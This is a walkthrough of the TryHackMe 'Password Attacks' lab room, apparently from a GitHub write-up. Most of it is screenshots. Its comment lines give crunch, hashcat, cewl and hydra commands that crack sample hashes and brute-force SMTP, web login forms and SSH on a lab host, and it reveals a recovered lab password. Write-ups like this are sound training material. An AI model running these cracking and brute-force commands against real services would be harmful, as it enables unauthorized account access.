# PASSWORD ATTACK WALKTHROUGH
# This room is part of the Red Teaming Learning Path on TryHackMe
# Link to the room 
https://tryhackme.com/room/passwordattacks

This room introduces the fundamental techniques to perform a successful password attack against various services and scenarios.

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/437b3f82-2500-401c-8a07-233399be3ca6)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/03bde926-8f54-40bf-9e91-f0d5f5df3197)

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/32150a2f-7fa8-4592-b2d2-70cd797da0ae)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/fc53b3f7-3197-46e8-8524-9836552e5924)

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/309f9e1f-9561-43a8-9681-dccc4d1b79b0)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/0cf0c36e-e8ba-42ef-af47-6221ff56d7ca)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/abb858fc-60c2-4a3b-a3ef-c04a6ede9828)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/fb66762e-87df-495c-9b51-36006b8b5575)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/5443cf6b-d229-4a3c-80dd-0cda1bbddcee)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/0db4c661-aa2c-4d64-80e3-02ca0cd86fad)

# Google default password of Juniper Networks ISG 2000 (i.e Apply OSINT) to answer Task 3

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/d904cdee-cf40-4954-a73f-5418af6160a4)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/e76636a2-2c84-45f2-8177-c774e76e4fe3)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/327d85f0-a4d2-41f5-92ed-666f7f7383fa)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/892c024f-7e65-41d8-a332-4a0f37077ca2)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/ee9ba0e9-c841-48c7-bf89-a3c7d6ebb25a)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/3025eb86-6773-4554-8801-7f4b84c1433a)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/dcf205f7-9f77-43c1-9a18-ac7d1b97f216)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/072ee280-61af-481d-af19-c5dcc6d7d85d)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/439ccc68-10c0-4fe2-a3e9-03127de0673b)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/53d07ca4-a0b4-4443-9364-bce8ae94f3fb)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/c5377900-a2cd-4b62-bdb5-57c91c12ea8f)

# For the first question of Task 4, use crunch 2 2 01234abcd -o crunch.txt and then cat crunch.txt | wc -l to see the number of words generated
# For the second question use crunch 5 5 THM^^  -o tryhackme.txt, as explained above ^ will be replaced with special characters, here we need two of them.

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/1018c9e1-9d84-4b94-a091-1d6707c0e846)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/4fc42287-3742-49a0-b9a8-b349346e3900)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/36b444e9-ed8e-4c87-9e70-43666b5bfd98)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/26aaaa1f-49e6-4efd-8a49-0bfab2634f22)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/be8c6b04-a9d6-4f95-aca9-b95adbb9e7be)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/d772cd03-87ec-449f-b18d-018c10e1a739)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/a4e4498f-37ab-49d8-80a2-746f3a6c3084)

# For Q1 Task 5: use hashid 8d6e34f987851aa599257d3831a1af040886842f to find out the type of hash
# For Q2: use hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f rockyou.txt (path to rockyou.txt, /usr/share/wordlists/rockyou.txt usually in kali)
# For Q3: use hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/045e2497-46d1-437c-ba51-ab7fe6226550)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/c5d1236f-be35-4dc3-9a4b-fdaa5caeaeaa)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/92035237-7370-4e89-9b97-e57e6bb3d39c)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/0a56e63f-72a7-4494-8732-00d3eb86fda5)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/8b8b8457-bb3e-46ea-b426-d7e8d084fadd)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/2ad78ee3-5f6a-4941-b882-c307c4a7c678)

# The answer is pretty self-explanatory.

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/f3830d70-8a95-4657-bcb7-64495787c4b8)

# Generate the custom wordlist - cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/ 

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/7dadd682-d360-46f1-8613-86c165aad8b1)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/1416504e-8974-4ab7-b435-522442b1682e)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/9c9fc25f-102d-4d7d-b226-af9d07497f4b)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/a2fce774-f9e9-47cc-8f76-625d8e0243eb)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/f66f3cfe-b213-49a6-b83a-728aebf0d1b6)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/ab9f3f4c-250b-4bc9-8ee3-d83e2b21a790)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/d33a75b1-0e30-478f-8da3-c0992277ae32)

# For Q1 Task 8: Sometimes, FTP allows anonymous login. ftp 10.10.130.195 (in this case)can be used to login. Get the flag /files/flag.txt
# For Q2, use hydra -l pittman@clinic.thmredteam.com -P passwords.lst smtps://10.10.130.195 (passwords.lst from previous task)
# For Q3, use hydra -l phillips -P clinic.lst 10.10.130.195 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" (previously generated clinic.lst)
# For Q4, first generate new list of passwords using: john --wordlist=clinic.lst --rules=Single-Extra > new_passwords.lst and then use hydra
# hydra -l burgess -P new_passwords.lst 10.10.130.195 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php"
# Note - once you find the passwords, login using the credentials to get the flags.

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/f8e40310-d91d-4be4-9431-f12f22599943)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/c13977d1-a304-4a25-8e51-f6b84e7952db)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/ec2e519d-6834-4067-9ea1-a5b769cbe845)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/5aec555e-dc20-4124-b3c3-d816809317eb)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/34cb6cbc-a1f3-4ec9-b25d-38db4e4d056b)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/e8ea180a-279e-4ba1-97be-eb1753ed626c)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/8aa41a19-a232-4023-b5c2-e023257b308e)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/9db29479-8edc-4754-802a-bb7bf9e7e03b)
![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/e50252b1-c87c-4382-ab19-d7eb71a3ebb5)

# For this task, first save the given usernames in a file, say usernames.lst and from the hint try to guess a password and feed it to hydra.
# hydra -L usernames.lst -p Fall2021@ ssh://10.10.130.195, returned username= burgess and password=Fall2021@

![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/efbbb783-96b0-4f45-baa3-5d59fda5b678)

It has been an interesting room and very informative on how to gain a foothold in system by manipulating credentials.
Credits: https://tryhackme.com/p/tryhackme






